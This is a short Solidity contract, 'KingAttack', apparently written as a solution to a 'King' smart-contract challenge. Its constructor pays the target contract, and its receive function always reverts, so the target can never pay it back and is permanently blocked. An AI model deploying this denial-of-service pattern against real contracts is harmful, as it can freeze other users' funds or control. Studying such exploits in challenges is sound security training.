// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract KingAttack {
    
    constructor(address payable _kingAddress) public payable {
        _kingAddress.call{value: address(this).balance}("");
    }

    receive() external payable {
            revert();
    }
    
}